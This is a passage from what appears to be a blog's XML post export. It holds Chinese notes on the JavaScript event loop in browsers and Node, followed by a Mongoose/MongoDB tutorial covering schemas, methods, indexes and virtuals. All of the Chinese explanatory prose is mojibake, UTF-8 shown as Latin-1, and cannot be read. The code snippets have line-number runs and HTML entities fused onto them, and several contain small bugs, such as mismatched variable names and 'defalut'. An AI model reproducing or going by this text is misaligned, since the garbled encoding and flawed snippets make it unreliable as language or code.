ä¸­çš„å¼‚æ­¥è¿˜æ˜¯åŒæ­¥è¡Œä¸ºã€‚ ä¸åŒçš„ä»»åŠ¡æºä¼šè¢«åˆ†é…åˆ°ä¸åŒçš„ Task é˜Ÿåˆ—ä¸­ï¼Œä»»åŠ¡æºå¯ä»¥åˆ†æˆ å¾®ä»»åŠ¡ï¼ˆmocrotaskï¼‰ å’Œ å®ä»»åŠ¡ï¼ˆmacrotask)ã€‚åœ¨ ES6 è§„èŒƒä¸­ï¼Œmacrotask è¢«ç§°ä¸º task,microtask è¢«ç§°ä¸º jobs ã€‚ä¸‹é¢ä¸¾ä¸ªä¾‹å­çœ‹çœ‹ä»£ç çš„æ‰§è¡Œé¡ºåºï¼š 123456789101112131415161718192021222324252627console.log('script start')async function async1() &#123; await async2() console.log('async1 end')&#125;async function async2() &#123; console.log('async2 end')&#125;async1()setTimeout(function() &#123; console.log('setTimeout')&#125;, 0)new Promise(resolve =&gt; &#123; console.log('Promise') resolve()&#125;) .then(function() &#123; console.log('promise1') &#125;) .then(function() &#123; console.log('promise2') &#125;)console.log('script end') å½“æˆ‘ä»¬è°ƒç”¨ async1 å‡½æ•°çš„æ—¶å€™ï¼Œä¼šé©¬ä¸Šè¾“å‡º async2 end,å¹¶ä¸”å‡½æ•°è¿”å›žä¸€ä¸ª Promiseï¼ŒæŽ¥ä¸‹æ¥åœ¨é‡åˆ° await çš„æ—¶å€™å°±è®©å‡ºçº¿ç¨‹å¼€å§‹æ‰§è¡Œ async1 å¤–çš„ä»£ç ï¼Œå¯ä»¥å®Œå…¨æŠŠ await çœ‹æˆæ˜¯è®©å‡ºçº¿ç¨‹çš„æ ‡å¿—ã€‚ ç„¶åŽå½“åŒæ­¥ä»£ç å…¨éƒ¨æ‰§è¡Œå®Œæ¯•ä»¥åŽï¼Œå°±ä¼šæ‰§è¡Œæ‰€æœ‰çš„å¼‚æ­¥ä»£ç ï¼Œé‚£ä¹ˆå°±ä¼šåˆå›žåˆ° await çš„ä½ç½®æ‰§è¡Œè¿”å›žçš„ Promise çš„ resolve å‡½æ•°ï¼Œè¿™åˆä¼šæŠŠ resolve ä¸¢åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼ŒæŽ¥ä¸‹æ¥æ‰§è¡Œ then ä¸­çš„å›žè°ƒï¼Œå½“ä¸¤ä¸ª then ä¸­çš„å›žè°ƒå…¨éƒ¨æ‰§è¡Œå®Œæ¯•åŽï¼Œå›žåˆ° await çš„ä½ç½®å¤„ç†è¿”å›žå€¼ï¼Œè¿™æ—¶å€™å¯ä»¥çœ‹æˆ Promise.resolve(è¿”å›žå€¼).then()ï¼Œç„¶åŽ await åŽçš„ä»£ç å…¨éƒ¨è¢«åŒ…è£¹è¿›äº† then çš„å›žè°ƒä¸­ï¼Œæ‰€ä»¥ console.log(&#39;async1 end&#39;) ä¼šä¼˜å…ˆæ‰§è¡ŒäºŽ setTimeoutã€‚ å¾®ä»»åŠ¡åŒ…æ‹¬ process.nextTick ï¼Œpromise ï¼ŒMutationObserverã€‚ å®ä»»åŠ¡åŒ…æ‹¬ script ï¼Œ setTimeout ï¼ŒsetInterval ï¼ŒsetImmediate ï¼ŒI/O ï¼ŒUI renderingã€‚ Event Loop æ‰§è¡Œé¡ºåºå¦‚ä¸‹æ‰€ç¤ºï¼š é¦–å…ˆæ‰§è¡ŒåŒæ­¥ä»£ç ï¼Œè¿™å±žäºŽå®ä»»åŠ¡ å½“æ‰§è¡Œå®Œæ‰€æœ‰åŒæ­¥ä»£ç åŽï¼Œæ‰§è¡Œæ ˆä¸ºç©ºï¼ŒæŸ¥è¯¢æ˜¯å¦æœ‰å¼‚æ­¥ä»£ç éœ€è¦æ‰§è¡Œ æ‰§è¡Œæ‰€æœ‰å¾®ä»»åŠ¡ å½“æ‰§è¡Œå®Œæ‰€æœ‰å¾®ä»»åŠ¡åŽï¼Œå¦‚æœ‰å¿…è¦ä¼šæ¸²æŸ“é¡µé¢ ç„¶åŽå¼€å§‹ä¸‹ä¸€è½® Event Loopï¼Œæ‰§è¡Œå®ä»»åŠ¡ä¸­çš„å¼‚æ­¥ä»£ç ï¼Œä¹Ÿå°±æ˜¯ setTimeout ä¸­çš„å›žè°ƒå‡½æ•° Node ä¸­çš„ Event Loop æ¶‰åŠçš„é¢è¯•é¢˜ï¼šNode ä¸­ Event Loop å’Œ æµè§ˆå™¨çš„æœ‰ä»€ä¹ˆä¸åŒï¼Ÿprocess.nextTick æ‰§è¡Œé¡ºåº Node ä¸­çš„ Event Loop åˆ†æˆ6ä¸ªé˜¶æ®µï¼Œå®ƒä»¬ä¼šæŒ‰ç…§é¡ºåºåå¤è¿è¡Œï¼Œæ¯å½“è¿›å…¥æŸä¸€ä¸ªé˜¶æ®µçš„æ—¶å€™ï¼Œéƒ½ä¼šä»Žå¯¹åº”çš„å›žè°ƒé˜Ÿåˆ—å–å‡ºå‡½æ•°åŽ»æ‰§è¡Œã€‚å½“é˜Ÿåˆ—ä¸ºç©ºæˆ–è€…æ‰§è¡Œçš„å›žè°ƒå‡½æ•°æ•°é‡è¾¾åˆ°ç³»ç»Ÿè®¾å®šçš„é˜ˆå€¼ï¼Œå°±ä¼šè¿›å…¥ä¸‹ä¸€ä¸ªé˜¶æ®µ 123456789101112131415161718â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”Œâ”€&gt;â”‚ timers â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚ I/O callbacks â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚ idle, prepare â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚ incoming: â”‚â”‚ â”‚ poll â”‚&lt;â”€â”€connectionsâ”€â”€â”€ â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚ data, etc. â”‚â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”‚ check â”‚â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â””â”€â”€â”¤ close callbacks â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ timer timer é˜¶æ®µä¼šæ‰§è¡Œ setTimeout å’Œ setInerval å›žè°ƒï¼Œå¹¶æ˜¯ç”± poll é˜¶æ®µæŽ§åˆ¶çš„ åŒæ ·ï¼Œåœ¨ Node ä¸­å®šæ—¶å™¨æŒ‡å®šçš„æ—¶é—´ä¹Ÿä¸æ˜¯å‡†ç¡®çš„æ—¶é—´ï¼Œåªæ˜¯å°½å¿«æ‰§è¡Œã€‚ I/O I/O é˜¶æ®µä¼šå¤„ç†ä¸Šä¸€è½®å¾ªçŽ¯ä¸­å°‘æ•°æœªæ‰§è¡Œçš„çš„ I/O å›žè°ƒ dle,prepare idle,prepare é˜¶æ®µå†…éƒ¨å®žçŽ° poll poll é˜¶æ®µå¾ˆé‡è¦ï¼Œåœ¨è¿™ä¸€é˜¶æ®µä¸­ï¼Œç³»ç»Ÿä¼šåšä¸¤ä»¶äº‹æƒ… æ‰§è¡Œåˆ°ç‚¹çš„å®šæ—¶å™¨ æ‰§è¡Œ poll é˜Ÿåˆ—ä¸­çš„äº‹ä»¶ å¹¶ä¸”å½“ poll ä¸­æ²¡æœ‰å®šæ—¶å™¨çš„æƒ…å†µä¸‹ï¼Œä¼šå‘çŽ°ä»¥ä¸‹ä¸¤ä»¶äº‹æƒ… å¦‚æžœpollé˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œä¼šéåŽ†å›žè°ƒé˜Ÿåˆ—å¹¶åŒæ­¥æ‰§è¡Œï¼Œç›´åˆ°é˜Ÿåˆ—ä¸ºç©ºæˆ–è€…ç³»ç»Ÿé™åˆ¶ å¦‚æžœpollé˜Ÿåˆ—ä¸ºç©º,ä¼šå‘ç”Ÿä¸¤ä»¶äº‹æƒ… å¦‚æžœæœ‰ setImmediate éœ€è¦æ‰§è¡Œçš„æ—¶å€™ï¼Œpoll é˜¶æ®µä¼šåœæ­¢å¹¶ä¸”è¿›å…¥åˆ° check é˜¶æ®µæ‰§è¡Œ setImmediate å¦‚æžœæ²¡æœ‰ setImmediate éœ€è¦æ‰§è¡Œï¼Œä¼šç­‰å¾…å›žè°ƒè¢«åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­å¹¶ç«‹å³æ‰§è¡Œå›žè°ƒï¼Œè¿™é‡ŒåŒæ ·ä¼šæœ‰ä¸ªè¶…æ—¶æ—¶é—´è®¾ç½®é˜²æ­¢ä¸€ç›´ç­‰å¾…ä¸‹åŽ» å½“ç„¶è®¾å®šäº† timer çš„è¯ä¸” poll é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™ä¼šåˆ¤æ–­æ˜¯å¦æœ‰ timer è¶…æ—¶ï¼Œå¦‚æžœæœ‰çš„è¯ä¼šå›žåˆ° timer é˜¶æ®µæ‰§è¡Œå›žè°ƒã€‚ check check é˜¶æ®µæ‰§è¡Œ setImmediate close callbacks close callbacks é˜¶æ®µæ‰§è¡Œäº† close äº‹ä»¶ã€‚ é¦–å…ˆåœ¨æœ‰äº›æƒ…å†µä¸‹ï¼Œå®šæ—¶å™¨çš„æ‰§è¡Œé¡ºåºå…¶å®žæ˜¯éšæœºçš„ 123456setTimeout(() =&gt; &#123; console.log(&apos;setTimeout&apos;)&#125;, 0)setImmediate(() =&gt; &#123; console.log(&apos;setImmediate&apos;)&#125;) å¯¹äºŽä»¥ä¸Šä»£ç æ¥è¯´ï¼ŒsetTimeout å¯èƒ½æ‰§è¡Œåœ¨å‰ï¼Œä¹Ÿå¯èƒ½æ‰§è¡Œåœ¨åŽ é¦–å…ˆ setTimeout(fn, 0) === setTimeout(fn, 1)ï¼Œè¿™æ˜¯ç”±æºç å†³å®šçš„ è¿›å…¥äº‹ä»¶å¾ªçŽ¯ä¹Ÿæ˜¯éœ€è¦æˆæœ¬çš„ï¼Œå¦‚æžœåœ¨å‡†å¤‡æ—¶å€™èŠ±è´¹äº†å¤§äºŽ 1ms çš„æ—¶é—´ï¼Œé‚£ä¹ˆåœ¨ timer é˜¶æ®µå°±ä¼šç›´æŽ¥æ‰§è¡Œ setTimeout å›žè°ƒ é‚£ä¹ˆå¦‚æžœå‡†å¤‡æ—¶é—´èŠ±è´¹å°äºŽ 1msï¼Œé‚£ä¹ˆå°±æ˜¯ setImmediate å›žè°ƒå…ˆæ‰§è¡Œäº† å½“ç„¶åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬çš„æ‰§è¡Œé¡ºåºä¸€å®šæ˜¯å›ºå®šçš„ï¼Œæ¯”å¦‚ä»¥ä¸‹ä»£ç ï¼š å½“ç„¶åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä»–ä»¬çš„æ‰§è¡Œé¡ºåºä¸€å®šæ˜¯å›ºå®šçš„ï¼Œæ¯”å¦‚ä»¥ä¸‹ä»£ç ï¼š 12345678910const fs = require(&apos;fs&apos;)fs.readFile(__filename, () =&gt; &#123; setTimeout(() =&gt; &#123; console.log(&apos;timeout&apos;); &#125;, 0) setImmediate(() =&gt; &#123; console.log(&apos;immediate&apos;) &#125;)&#125;) åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼ŒsetImmediate æ°¸è¿œå…ˆæ‰§è¡Œã€‚å› ä¸ºä¸¤ä¸ªä»£ç å†™åœ¨ IO å›žè°ƒä¸­ï¼ŒIO å›žè°ƒæ˜¯åœ¨ poll é˜¶æ®µæ‰§è¡Œï¼Œå½“å›žè°ƒæ‰§è¡Œå®Œæ¯•åŽé˜Ÿåˆ—ä¸ºç©ºï¼Œå‘çŽ°å­˜åœ¨ setImmediate å›žè°ƒï¼Œæ‰€ä»¥å°±ç›´æŽ¥è·³è½¬åˆ° check é˜¶æ®µåŽ»æ‰§è¡Œå›žè°ƒäº†ã€‚ process.nextTick è¿™ä¸ªå‡½æ•°æ˜¯ç‹¬ç«‹äºŽ Event Loop ä¹‹å¤–çš„ï¼Œå®ƒæœ‰ä¸€ä¸ªè‡ªå·±çš„é˜Ÿåˆ—ï¼Œå½“æ¯ä¸ªé˜¶æ®µå®Œæˆä¹‹åŽï¼Œå¦‚æžœå­˜åœ¨ nextTick é˜¶æ®µï¼Œå°±ä¼šæ¸…ç©ºé˜Ÿåˆ—ä¸­çš„æ‰€æœ‰å›žè°ƒå‡½æ•°ï¼Œå¹¶ä¼˜äºŽå…¶ä»– microtask æ‰§è¡Œ 1234567891011121314151617181920212223242526setTimeout(() =&gt; &#123; console.log('timer1') Promise.resolve().then(function() &#123; console.log('promise1') &#125;)&#125;, 0)process.nextTick(() =&gt; &#123; console.log('nextTick') process.nextTick(() =&gt; &#123; console.log('nextTick') process.nextTick(() =&gt; &#123; console.log('nextTick') process.nextTick(() =&gt; &#123; console.log('nextTick') &#125;) &#125;) &#125;)&#125;)// nextTick// nextTick// nextTick// nextTick// timer1// promise1 å‚è€ƒé“¾æŽ¥ï¼šå‰ç«¯é¢è¯•é¢˜ç›®å·²ç»ç­”æ¡ˆæ±‡æ€» é˜²æŠ–]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>å‰ç«¯é¢è¯•é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mongoose]]></title>
    <url>%2F2019-03-26-mongoose.html</url>
    <content type="text"><![CDATA[MongoDBæ˜¯ä¸€ä¸ªä»‹äºŽå…³ç³»æ•°æ®åº“å’Œéžå…³ç³»æ•°æ®åº“ä¹‹é—´çš„äº§å“ï¼Œæ˜¯éžå…³ç³»æ•°æ®åº“å½“ä¸­åŠŸèƒ½æœ€ä¸°å¯Œï¼Œæœ€åƒå…³ç³»æ•°æ®åº“çš„ã€‚å®ƒæ”¯æŒçš„æ•°æ®ç»“æž„éžå¸¸æ¾æ•£ï¼Œæ˜¯ç±»ä¼¼jsonçš„bsonæ ¼å¼ï¼Œå› æ­¤å¯ä»¥å­˜å‚¨æ¯”è¾ƒå¤æ‚çš„æ•°æ®ç±»åž‹ã€‚Mongoæœ€å¤§çš„ç‰¹ç‚¹æ˜¯å®ƒæ”¯æŒçš„æŸ¥è¯¢è¯­è¨€éžå¸¸å¼ºå¤§ï¼Œå…¶è¯­æ³•æœ‰ç‚¹ç±»ä¼¼äºŽé¢å‘å¯¹è±¡çš„æŸ¥è¯¢è¯­è¨€ï¼Œå‡ ä¹Žå¯ä»¥å®žçŽ°ç±»ä¼¼å…³ç³»æ•°æ®åº“å•è¡¨æŸ¥è¯¢çš„ç»å¤§éƒ¨åˆ†åŠŸèƒ½ï¼Œè€Œä¸”è¿˜æ”¯æŒå¯¹æ•°æ®å»ºç«‹ç´¢å¼•ã€‚ Mongooseæ˜¯åœ¨node.jsçŽ¯å¢ƒä¸‹å¯¹mongodbè¿›è¡Œä¾¿æ·æ“ä½œçš„å¯¹è±¡æ¨¡åž‹å·¥å…· å­¦ä¹ é“¾æŽ¥ å¿«é€Ÿä¸Šæ‰‹è¯·å…ˆå®‰è£… MongoDB å’Œ Node.jsã€‚ ä¸‹ä¸€æ­¥ï¼Œnpmå®‰è£…Mongoose: 1npm i mongoose è¿žæŽ¥æ•°æ®åº“test 12const mongoose = require('mongoose');mongoose.connect('mongodb://localhost/test'); connect()è¿”å›žä¸€ä¸ªçŠ¶æ€å¾…å®šï¼ˆpendingï¼‰çš„è¿žæŽ¥ï¼ŒæŽ¥ç€æˆ‘ä»¬åŠ ä¸ŠæˆåŠŸå’Œå¤±è´¥çš„æé†’ï¼š 12345const db = mongoose.connection;db.on('error',console.error.bind(console,'connection error:'));db.once('open',function()&#123; // .. &#125;); è¿žæŽ¥æˆåŠŸçš„æ—¶å€™ï¼Œå›žè°ƒå‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œå‡è®¾ä¸‹é¢æ‰€æœ‰å‡½æ•°éƒ½åœ¨è¿™ä¸ªå›žè°ƒå‡½æ•°é‡Œé¢ã€‚ Mongoose é‡Œé¢ä¸€åˆ‡å§‹äºŽ Schemaã€‚çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š 123const KittySchema = mongoose.Schema(&#123; name:String&#125;); æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªå¸¦æœ‰ Stringç±»åž‹çš„ name å±žæ€§çš„ schema,æŽ¥ç€æŠŠè¿™ä¸ª schema ç¼–è¯‘æˆä¸€ä¸ª Model: 1const Kitten = mongoose.model('Kitten',kittySchema); model æ˜¯æˆ‘ä»¬åˆ›é€ çš„ document çš„ Classã€‚åœ¨ä¾‹å­ä¸­ï¼Œæ¯ä¸ª document éƒ½æ˜¯ä¸€ä¸ªå®žä¾‹ï¼Œå®ƒçš„å±žæ€§å’Œè¡Œä¸ºéƒ½ä¼šè¢«å£°æ˜Žåœ¨ schema ã€‚ 123456789const felyne = new Kitten(&#123;name:'Felyne'&#125;);felyne.name // 'Felyne';// ç»™ document åŠ ä¸€ä¸ª speak æ–¹æ³•KittySchema.methods.speak = function()&#123; const greeting = this.name ? "Meow name is " + this.name: "I don't have a name"; console.log(greeting);&#125;const Kitten = mongoose.model('Kitten',kittySchema); åŠ åœ¨ schema çš„ methods å±žæ€§çš„å‡½æ•°ä¼šç¼–è¯‘åˆ° Model çš„prototype,ä¹Ÿä¼šæš´éœ²æ­é…æ¯ä¸ª document å®žä¾‹ï¼š 12const a = new Kitten(&#123;name:'A'&#125;);a.speak(); // Meow name is A æ¯ä¸ª document ä¼šåœ¨è°ƒç”¨å®ƒçš„ save æ–¹æ³•åŽä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œæ³¨æ„å›žè°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œæ˜¯ error 1234A.save(function(err,A)&#123; if(err) return console.error(err); A.speak();&#125;); å¦‚æžœæœ‰å¾ˆå¤šä¸ªå®žä¾‹ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•æ¥èŽ·å– model é‡Œé¢çš„æ‰€æœ‰æ•°æ® 1234Kitten.find(function(err,kittens)&#123; if(err) return console.error(err); console.log(kittens);&#125;) æ¨¡å¼ï¼ˆSchemasï¼‰å®šä¹‰ä¸€ä¸ªschemaMongoose çš„ä¸€åˆ‡å§‹äºŽ Schema,æ¯ä¸ª schama éƒ½ä¼šæ˜ å°„åˆ°ä¸€ä¸ª MongoDB collectionï¼Œå¹¶å®šä¹‰è¿™ä¸ª collection é‡Œé¢çš„æ–‡æ¡£çš„æž„æˆã€‚ 1234567891011121314151617const mongoose = require('mongoose');const Schema = mongoose.Schema;const blog = new Schema(&#123; title:String, author:String, body:String, comments:[&#123;body:String,date:Date&#125;], date:&#123; type:Date, defalut:Date.now &#125;, hidden:Boolean, meta:&#123; votes:Number, favs:Number &#125;&#125;); document é‡Œé¢çš„æ¯ä¸ªå±žæ€§éƒ½ä¼šè¢«è½¬æ¢æˆåœ¨ blogSchema é‡Œé¢å¯¹åº”çš„ SchemaTypeã€‚ä¾‹å¦‚ title å±žæ€§ä¼šè¢«è½¬æ¢æˆä¸º SchemaType String,è€Œ dateå±žæ€§ä¼šè¢«è½¬æ¢æˆä¸º SchemaType Dateã€‚è¿˜å¯ä»¥åƒ metaå±žæ€§ä¸€æ ·ï¼Œæ›´åŠ è¯¦ç»†åœ°æŒ‡å®šåµŒå¥—åœ¨é‡Œé¢çš„å±žæ€§ç±»åž‹ã€‚ è¿è¡Œä½¿ç”¨çš„ SchemaTypes æœ‰ï¼š String Number Boolean Date Buffer Mixed ObjectId Array Schema çš„åŠŸèƒ½ä¸åªæ˜¯å®šä¹‰æ–‡æ¡£ç»“æž„å’Œå±žæ€§ç±»åž‹ï¼Œè¿˜å¯ä»¥å®šä¹‰ document çš„ instance methods model çš„ static Model methods å¤åˆç´¢å¼• æ–‡æ¡£çš„ç”Ÿå‘½å‘¨æœŸé’©å­ï¼Œä¹Ÿç§°ä¸ºä¸­é—´ä»¶ åˆ›å»ºä¸€ä¸ª modelmongoose.model(modelName,schema) å‡½æ•°æŠŠ schema è½¬æ¢ä¸ºä¸€ä¸ª Model: 1const Blog = mongoose.model('Blob',blogSchema); å®žä¾‹æ–¹æ³•ï¼ˆmethodï¼‰document æ˜¯ Models çš„å®žä¾‹ã€‚Document æœ‰å¾ˆå¤šè‡ªå¸¦çš„å®žä¾‹æ–¹æ³•ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è‡ªå®šä¹‰æˆ‘ä»¬è‡ªå·±çš„æ–¹æ³• 123456// å®šä¹‰ä¸€ä¸ª schemaconst animalSchema = new Schema(&#123;name:String,type:String&#125;);animalSchema.methods.findSimilarTypes = function(cb)&#123; return this.model('Animal').find(&#123;type:this.type&#125;,cb);&#125; çŽ°åœ¨æ‰€æœ‰çš„ animal å®žä¾‹éƒ½æœ‰ findSimilarTypes æ–¹æ³•ï¼š 123456const Animal = mongoose.model('Animal',animalSchema);const dog = new Animal(&#123;typeï¼š'dog'&#125;);dog.findSimilarTypes(function(err,dogs)&#123; console.log(dogs); // woof&#125;); é‡å†™ mongoose çš„é»˜è®¤æ–¹æ³•ä¼šé€ æˆæ— æ³•é¢„æ–™çš„ç»“æžœ ä¸è¦åœ¨è‡ªå®šä¹‰æ–¹æ³•ä¸­ä½¿ç”¨ ES6 ç®­å¤´å‡½æ•°ï¼Œä¼šé€ æˆ this æŒ‡å‘é”™è¯¯ é™æ€æ–¹æ³•ï¼ˆstaticï¼‰æ·»åŠ  Model çš„é™æ€æ–¹æ³•ä¹Ÿååˆ†ç®€å•ï¼Œç»§ç»­ä½¿ç”¨ animalSchema ä¸¾ä¾‹ï¼š 1234567animalSchema.statics.findByName = function(name,cb)&#123; return this.find(&#123;name:new RegExp(name,'i')&#125;,cb)&#125;const Animal = mongoose.model('Animal',animalSchema);Animal.findByName('fido',function(err,animals)&#123; console.log(animals);&#125;); åŒæ ·æ³¨æ„çš„æ˜¯ä¸è¦åœ¨é™æ€æ–¹æ³•ä¸­ä½¿ç”¨ ES6 çš„ç®­å¤´å‡½æ•° æŸ¥è¯¢åŠ©æ‰‹ï¼ˆquery helperï¼‰æŸ¥è¯¢åŠ©æ‰‹ä½œç”¨äºŽ query å®žä¾‹ï¼Œæ–¹ä¾¿è‡ªå®šä¹‰æ‰©å±•é“¾å¼æŸ¥è¯¢ 1234567animalSchema.query.byName = function(name)&#123; return this.find(&#123;name:new RegExp(name,'i')&#125;);&#125;const Animal = mongoose.model('Animal',animalSchema);Animal.find().byName('fido').exec(function(err,animal)&#123; console.log(animals);&#125;); ç´¢å¼•ï¼ˆindexï¼‰MongoDB æ”¯æŒ secondary indexesã€‚åœ¨ mongoose ä¸­ï¼Œæˆ‘ä»¬åœ¨ Schema å®šä¹‰ç´¢å¼•ã€‚ç´¢å¼•åˆ†å­—æ®µçº§åˆ«å’Œ schema çº§åˆ«ï¼Œå¤åˆç´¢å¼•éœ€è¦åœ¨ schema çº§åˆ«å®šä¹‰ã€‚ 12345678910const animalSchema = new Schema(&#123; name:String, type:String, tags:&#123; type:[String], index:true &#125;&#125;);animalSchema.index(&#123;name:1,type:-1&#125;); åº”ç”¨å¯åŠ¨çš„æ—¶å€™ï¼ŒMongoose ä¼šè‡ªåŠ¨è°ƒç”¨ createIndex åˆå§‹åŒ–å®šä¹‰çš„ç´¢å¼•ã€‚Mongoose é¡ºåºå¤„ç†æ¯ä¸€ä¸ª createIndexï¼Œç„¶åŽåœ¨ model è§¦å‘ â€˜indexâ€™ äº‹ä»¶ã€‚åœ¨ç”Ÿäº§ä¸­å»ºè®®ç¦æ­¢è¿™ç§è¡Œä¸ºï¼Œå› ä¸ºåˆ›å»ºç´¢å¼•ä¼šå¯¹æ€§èƒ½é€ æˆé‡å¤§å½±å“ã€‚ 12345mongoose.connect('mongodb://user:pass@localhost:port/database',&#123;autoIndex:false&#125;);// æˆ–è€…mongoose.createConnection('mongodb://user:pass@localhost:port/database',&#123;autoIndex:false&#125;);// æˆ–è€…new Schema(&#123;..&#125;,&#123;autoIndex:false&#125;); ç´¢å¼•åˆ›å»ºå®Œæˆæˆ–è€…å¤±è´¥ï¼ŒMongoose ä¼šè§¦å‘ index äº‹ä»¶ 1234567// Will cause an error because mongodb has an _id index by default that is not sparseanimalSchema.index(&#123;_id:1&#125;,&#123;sparse:true&#125;);const Animal = mongoose.model('Animal',animalSchema);Animal.on('index',function(err)&#123; // _id index cannot be sparse console.log(err);&#125;); è™šæ‹Ÿå€¼ï¼ˆVirtualï¼‰Virtual æ˜¯ document çš„å±žæ€§ï¼Œä½†æ˜¯ä¸ä¼šè¢«ä¿å­˜åˆ° MongoDB.getter å¯ä»¥ç”¨äºŽæ ¼å¼åŒ–å’Œç»„åˆå­—æ®µæ•°æ®ï¼Œsetter å¯ä»¥å¾ˆæ–¹ä¾¿åœ°åˆ†è§£ä¸€ä¸ªå€¼åˆ°å¤šä¸ªå­—æ®µã€‚ 12345678910111213const personSchema = new Schema(&#123; name:&#123; first:String, last:String &#125;&#125;);const Person = mongoose.model('Person',personSchema);const axl = new Person(&#123; name:&#123;first:'Axl',last:'Rose'&#125;&#125;);console.log(axl.name.first + ' ' + axl.name.last); //Axl Rose ä½†æ˜¯æ¯æ¬¡éƒ½è¦è¿™æ ·æ‹¼æŽ¥å°±å¤ªéº»çƒ¦äº†ï¼Œä½¿ç”¨ virtual property getter è¿™ä¸ªæ–¹æ³•å…è®¸å®šä¹‰ä¸€ä¸ª fullName å±žæ€§ï¼Œä½†ä¸å¿…ä¿å­˜åˆ°æ•°æ®åº“ã€‚ 1234personSchema.virtual('fullName').get(function()&#123; return this.name.first + ' ' + this.name.last&#125;);console.log(axl.fullName); // Axl Rose å¦‚æžœå¯¹ document ä½¿ç”¨ toJSONï¼ˆï¼‰ æˆ– toObject() é»˜è®¤ä¸åŒ…æ‹¬è™šæ‹Ÿå€¼ï¼Œéœ€è¦é¢å¤–å‘ toObject æˆ–è€… toJSON ä¼ å…¥å‚æ•° {virtuals:true} ä¹Ÿå¯ä»¥è®¾å®šè™šæ‹Ÿå€¼çš„ setterï¼Œä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œå½“èµ‹å€¼åˆ°è™šæ‹Ÿå€¼çš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨æ‹†åˆ†åˆ°å…¶ä»–å±žæ€§ 1234567personSchema.virtual('fullName').get(function()&#123; return this.name.first + ' ' + this.name.last&#125;).set(function(v)&#123; this.name.first = v.substr(0,v.indexOf(' ')); this.name.last = v.substr(v.indexOf(' ')+1);&#125;);axl.fullName = 'William Rose' // Now `axl.name.first` is "William" éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™šæ‹Ÿå€¼ä¸èƒ½ç”¨äºŽæŸ¥è¯¢å’Œå­—æ®µé€‰æ‹©ï¼Œå› ä¸ºè™šæ‹Ÿå€¼ä¸å­˜å‚¨åœ¨ MongoDB åˆ«åï¼ˆAliasï¼‰Aliase æ˜¯ä¸€ç§ç‰¹æ®Šçš„è™šæ‹Ÿå€¼ï¼Œå®ƒçš„getter å’Œ setter ä¼šæ— ç¼é“¾æŽ¥åˆ°å¦ä¸€ä¸ªå€¼ï¼Œè¿™æ˜¯ä¸€ä¸ªèŠ‚çœå¸¦å®½çš„åšæ³•ï¼Œå¯ä»¥å­˜å‚¨ä¸€ä¸ªæ›´çŸ­çš„å±žæ€§ååˆ°æ•°æ®åº“ï¼ŒåŒæ—¶åœ¨è°ƒç”¨çš„æ—¶å€™ä¿æŒå¯è¯»æ€§ã€‚ 12345678910111213const personSchema = new Schema(&#123; n:&#123; type:String, alias:'name' &#125;&#125;);const person = new Person(&#123;name:'Val'&#125;);person //&#123;n:'Val'&#125;person.toObject(&#123;virtuals:true&#125;) //&#123;n:'Val',name:'Val'&#125;person.name // Valperson.name = 'Not Val';person // &#123;n:'Not Val'&#125; é€‰é¡¹Schema æœ‰å¾ˆå¤šå¯é…ç½®é€‰é¡¹ï¼Œå¯ä»¥åœ¨æž„é€ æ—¶ä¼ å…¥æˆ–è€…ç›´æŽ¥ set 